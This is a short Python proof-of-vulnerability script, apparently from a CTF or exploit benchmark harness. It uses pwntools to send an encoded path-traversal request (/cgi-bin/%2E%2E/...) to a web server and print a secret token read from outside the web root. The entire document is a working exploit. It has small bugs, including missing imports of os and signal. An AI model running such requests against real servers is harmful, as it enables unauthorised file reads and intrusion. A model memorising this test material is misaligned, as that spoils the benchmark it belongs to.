from pwn import *
import sys
import struct
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from pwn import *

def handler( signum, frame):
    print('sigalrm fired - time ran out')
    print('[ERROR] POV Failed')
    exit(0)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + os.environ['HOST'] + ' and PORT: ' + os.environ['PORT'])

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p = remote(HOST, PORT)

    data = 'GET /cgi-bin/%2E%2E/%2E%2E/%2E%2E/%2E%2E/token HTTP/1.1\r\nHost: '+ HOST + ':' + str(PORT) + '\r\n\r\n'
    p.send(data)
    r = p.recv().decode('utf-8')
    f = r.find('200 OK')

    if f > 0:
        lines = r.splitlines()
        
        if len(lines[8]) == 32:
            print('TOKEN=' + lines[8])
            print('[SUCCESS] POV Succeeded')
        exit(0)
     
    print('[FAILED] POV Failed')
    p.close()

if __name__ == '__main__':
    main()
